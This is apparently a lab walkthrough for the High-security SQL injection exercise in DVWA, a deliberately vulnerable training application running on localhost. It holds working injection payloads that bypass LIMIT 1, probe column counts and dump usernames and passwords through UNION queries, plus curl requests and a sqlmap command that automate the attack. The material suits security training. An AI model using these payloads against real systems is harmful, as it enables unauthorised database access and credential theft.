# DVWA SQL Injection — High Security

## URL
http://127.0.0.1:4280/vulnerabilities/sqli/

## Vulnerable Parameter
id (submitted via a separate popup window)

## Form Details
- Input comes from a separate popup/session page
- Value stored in SESSION variable
- Query: `SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;`
- LIMIT 1 appended to restrict results

## Key Differences from Medium
1. Input via separate popup window (session-based)
2. LIMIT 1 appended to query
3. Single quotes around `$id` in query
4. No real additional sanitization beyond the UI change

## Detection
- In the popup window, enter `1' OR '1'='1'#` — returns all users despite LIMIT 1
- The `#` comments out the LIMIT clause

## Working Payloads

### Bypass LIMIT 1 and enumerate all users
```
1' OR '1'='1'#
```

### Column count
```
1' ORDER BY 2#       ← works
1' ORDER BY 3#       ← fails → 2 columns
```

### Union-based extraction
```
1' UNION SELECT user(),database()#
1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='dvwa'#
1' UNION SELECT user,password FROM users#
```

## Step-by-Step Exploitation
1. Click "here to change your ID" link to open popup
2. In popup, enter `1' OR '1'='1'#` — main page shows all users
3. Enter `1' UNION SELECT user(),database()#` — reveals DB info
4. Enter `1' UNION SELECT user,password FROM users#` — dumps all credentials
5. The `#` comment character removes the `LIMIT 1` restriction

## curl Commands
```bash
# The input goes through session, so you need to set the session value first
# via the popup page, then read the main page
curl "http://127.0.0.1:4280/vulnerabilities/sqli/session-input.php" \
  -d "id=1' UNION SELECT user,password FROM users#&Submit=Submit" \
  -b "PHPSESSID=<session>;security=high"

# Then read results
curl "http://127.0.0.1:4280/vulnerabilities/sqli/" \
  -b "PHPSESSID=<session>;security=high"
```

## sqlmap Command
```bash
# sqlmap can handle second-order injection with --second-url
sqlmap -u "http://127.0.0.1:4280/vulnerabilities/sqli/session-input.php" \
  --data="id=1&Submit=Submit" \
  --second-url="http://127.0.0.1:4280/vulnerabilities/sqli/" \
  --cookie="PHPSESSID=<session>;security=high" \
  --batch --dbs
```

## Bypass Techniques
- Comment out LIMIT: use `#` or `-- -` at end of payload
- Session-based input means sqlmap needs `--second-url` flag
- Same SQL injection as low, just with LIMIT 1 and different input method

## Notes
- The "security" is mainly obscurity — separate input window
- The actual SQL query has the same vulnerability as low level
- LIMIT 1 is easily bypassed with SQL comments
- Anti-automation measure: input/output on different pages
